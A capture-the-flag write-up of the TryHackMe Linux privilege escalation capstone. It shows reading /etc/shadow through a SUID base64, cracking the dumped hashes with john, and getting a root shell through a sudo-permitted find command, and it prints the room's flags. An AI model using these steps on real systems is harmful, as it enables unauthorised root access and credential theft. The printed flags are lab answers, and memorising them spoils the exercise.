+++
title = "THM's Linux Privilege Escalation - Capstone"
author = ["a1v4"]
date = 2024-08-16
lastmod = 2024-08-16T01:22:22-05:00
tags = ["tryhackme", "writeup"]
draft = false
+++

Writeup for TryHackMe's _Linux Privilege Escalation_ capstone task.

<!--more-->

[Link to the room](https://tryhackme.com/r/room/linprivesc)

We connect to the box and run [linpeas](linpeas.txt), then we check through the list of
privilege escalation vectors listed in the room. We find that `base64` has
`suid` set.

```nil
-rwsr-xr-x. 1 root root 37K Aug 20  2019 /usr/bin/base64
```

We can use it to read `/etc/shadow`.

```nil
[leonard@ip-10-10-54-149 ~]$ base64 /etc/shadow | base64 -d
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```

The password's hashes are salted, so we can't use something like
<https://crackstation.net> but instead have to run `john`. We copy `shadow` to our working
directory and attempt to crack it.

```nil
$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt shadow
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Password1        (missy)
Penny123         (leonard)
```

It quickly found `missy`'s password but not root's, I left it running but didn't
expect to find it as we already got horizontal privilege escalation. (Funny
enough, that was the password being used for the user in all the previous
rooms.) We switch to the `missy` user with `su`.

```nil
[leonard@ip-10-10-54-149 ~]$ su missy
Password:
[missy@ip-10-10-54-149 leonard]$ id
uid=1001(missy) gid=1001(missy) groups=1001(missy) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

We search for the flag files with `find`.

```nil
[missy@ip-10-10-54-149 leonard]$ find / -name 'flag*.txt' 2>/dev/null
/home/missy/Documents/flag1.txt
```

Only found the first one: `THM-42828719920544`.

We could run linpeas again, but most of it would be the same, so we just run the
enumeration commands manually. We run `sudo -l` and get:

```nil
[missy@ip-10-10-54-149 leonard]$ sudo -l
Matching Defaults entries for missy on ip-10-10-54-149:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-54-149:
    (ALL) NOPASSWD: /usr/bin/find
```

Check in [GTFOBins](https://gtfobins.github.io/) for [the `find` binary](https://gtfobins.github.io/gtfobins/find/) and find we can get a shell:

```nil
[missy@ip-10-10-54-149 leonard]$ sudo find . -exec /bin/sh \; -quit
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Repeat the `find` command to find the missing flag.

```nil
sh-4.2# find / -name 'flag*.txt' 2>/dev/null
/home/missy/Documents/flag1.txt
/home/rootflag/flag2.txt
```

The flag is `THM-168824782390238`.
